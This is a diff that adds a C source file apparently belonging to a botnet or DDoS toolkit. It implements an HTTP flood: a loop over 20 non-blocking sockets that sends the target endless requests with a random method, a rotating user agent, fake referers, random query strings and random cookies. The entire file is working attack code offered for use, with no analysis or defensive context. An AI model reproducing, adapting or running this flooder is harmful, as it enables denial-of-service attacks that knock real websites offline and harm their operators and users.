@@ -1,0 +1,205 @@
+#include "../../include/include.h"
+#include "../../include/methods.h"
+#include <fcntl.h>
+#include <errno.h>
+
+#define MAXCONNECTIONS 20
+
+static char host[65535];
+static const char part1[]=" / HTTP/1.1\r\nCache-Control: no-cache\r\n"
+	"Connection: Keep-Alive\r\nKeep-Alive: 300\r\nAccept-Encoding: gzip,"
+	" deflate, compress\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nHost: ";
+static char *useragents[]={
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
+	" Gecko) Chrome/51.0.2704.103 Safari/537.36",
+
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
+	" Gecko) Chrome/52.0.2743.116 Safari/537.36",
+
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
+	" Gecko) Chrome/51.0.2704.103 Safari/537.36",
+
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
+	" Gecko) Chrome/52.0.2743.116 Safari/537.36",
+
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7"
+	" (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+};
+static char *requests[] = {
+	"GET","POST","HEAD","PUT",
+	"DELETE","OPTIONS","TRACE"
+};
+static char *referers[] = {
+	"http://www.google.com/?q=",
+	"http://www.usatoday.com/search/results?q=",
+	"http://engadget.search.aol.com/search?q="
+};
+static char *content_type[] = {
+	"multipart/form-data",
+	"application/x-url-encoded"
+};
+static u_char valid[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	"0123456789";
+
+typedef struct __conn {
+	int fd, state;	/* 0=connecting 1=ready to send */
+} conn_t;
+static struct sockaddr_in	sin;
+static int			n;
+static char			frame[65535];
+static u_char			qbuf[2048];
+static int			maxfd;
+static conn_t			cs[MAXCONNECTIONS];
+struct timeval			tv;
+static fd_set			wfds;
+
+static void asciiblock(size_t len, u_char *out, size_t outlen)
+{
+	size_t i;
+	if (len>=outlen)
+		return;
+	for (i=0;i<len;i++)
+		out[i]=valid[cmwc_random_num(0,sizeof(valid)-1)];
+	out[len]='\0';
+}
+
+static u_char *querystr(size_t ammount, u_char *out, int outlen)
+{
+	u_char value[21];
+	u_char key[21];
+	int i,l1,l2,totlen=0;
+
+	for (i=0;i<ammount;i++) {
+		l1=cmwc_random_num(3, 10);
+		l2=cmwc_random_num(3, 20);
+		asciiblock(l1,key,sizeof(key));
+		asciiblock(l2,value,sizeof(value));
+		if (totlen+l1+l2+2>=outlen)
+			return NULL;
+		if (i>0) {
+			strcat((char*)out,"&");
+			++totlen;
+		}
+		strcat((char*)out,(char*)key);
+		strcat((char*)out,"=");
+		strcat((char*)out,(char*)value);
+		totlen+=l1+l2+1;
+	}
+	out[totlen]='\0';
+	return out;
+}
+
+void tcp_http_flood(u_int target, u_int source,
+	int port, int pps, int time, void *arg)
+{
+	FLOOD_INIT;
+
+	SRANDOM();
+	memset(&sin,0,sizeof(sin));
+	sin.sin_family=AF_INET;
+	sin.sin_addr.s_addr=target;
+	snprintf(host,sizeof(host),"%s",(const char*)arg);
+	sin.sin_port=(port==-1)?htons(random_u16()+300):htons(port);
+
+	for (n=0;n<MAXCONNECTIONS;n++) {
+		cs[n].fd=-1;
+		cs[n].state=0;
+	}
+
+	for (;;) {
+		FD_ZERO(&wfds);
+		maxfd=-1;
+		for (n=0;n<MAXCONNECTIONS;n++) {
+			if (cs[n].fd==-1) {
+				cs[n].fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+				fcntl(cs[n].fd,F_SETFL,O_NONBLOCK);
+				connect(cs[n].fd, (struct sockaddr*)&sin, sizeof(sin));
+				cs[n].state=0;
+			}
+			else if (cs[n].state==0) {
+				FD_SET(cs[n].fd, &wfds);
+				if (cs[n].fd>maxfd)
+					maxfd=cs[n].fd;
+			}
+			else if (cs[n].state==1) {
+				FD_SET(cs[n].fd, &wfds);
+				if (cs[n].fd>maxfd)
+					maxfd=cs[n].fd;
+			}
+		}
+
+		tv.tv_sec=0;
+		tv.tv_usec=1;
+
+		if ((select(maxfd+1,NULL,&wfds,NULL,&tv))<=0)
+			continue;
+		for (n=0;n<MAXCONNECTIONS;n++) {
+			if (cs[n].fd==-1)
+				continue;
+			if (FD_ISSET(cs[n].fd, &wfds)) {
+				if (cs[n].state==0&&cs[n].fd!=-1) {
+					socklen_t	len;
+					int		err;
+
+					len=sizeof(err);
+					getsockopt(cs[n].fd, SOL_SOCKET, SO_ERROR, &err, &len);
+					if (err==0) {
+						cs[n].state=1;	/*	ready	*/
+					}
+					else {
+						cs[n].fd=-1;
+						cs[n].state=0;
+						continue;
+					}
+				}
+				else if (cs[n].state==1) {
+					memset(frame,0,sizeof(frame));
+					strcpy(frame,requests[cmwc_random_num(0,6)]);
+					strcpy(frame+strlen(frame),part1);
+					strcpy(frame+strlen(frame),host);
+					strcpy(frame+strlen(frame),"\r\nUser-Agent: ");
+					strcpy(frame+strlen(frame),useragents[cmwc_random_num(0,4)]);
+					strcpy(frame+strlen(frame),"\r\n");
+					if (cmwc_random_num(0,1)==0) {
+						strcpy(frame+strlen(frame),"Referer: ");
+						if (cmwc_random_num(0,1)==0)
+							strcpy(frame+strlen(frame),referers[cmwc_random_num(0,2)]);
+						else {
+							strcpy(frame+strlen(frame),"http://");
+							strcpy(frame+strlen(frame),host);
+							strcpy(frame+strlen(frame),"/");
+						}
+						memset(qbuf,0,sizeof(qbuf));
+						strcpy(frame+strlen(frame),(char*)querystr(cmwc_random_num(5,10),qbuf,sizeof(qbuf)));
+						strcpy(frame+strlen(frame),"\r\n");
+					}
+					if (cmwc_random_num(0,1)==0) {
+						strcpy(frame+strlen(frame),"Content-Type: ");
+						strcpy(frame+strlen(frame),content_type[cmwc_random_num(0,1)]);
+						strcpy(frame+strlen(frame),"\r\n");
+					}
+					if (cmwc_random_num(0,1)==0) {
+						memset(qbuf,0,sizeof(qbuf));
+						strcpy(frame+strlen(frame),"Cookie: ");
+						strcpy(frame+strlen(frame),(char*)querystr(cmwc_random_num(1,2),qbuf,sizeof(qbuf)));
+						strcpy(frame+strlen(frame),"\r\n");
+					}
+					strcpy(frame+strlen(frame),"\r\n");
+
+					FLOOD_SEND(cs[n].fd,frame,strlen((char*)frame),MSG_NOSIGNAL,
+						tcp_http_floodstop);
+					close(cs[n].fd);
+					cs[n].fd=-1;
+				}
+			}
+		}
+	}
+}
+
+void tcp_http_floodstop(int sig)
+{
+	for (n=0;n<MAXCONNECTIONS;n++)
+		if (cs[n].fd!=-1)
+			close(cs[n].fd);
+	exit(sig);
+}
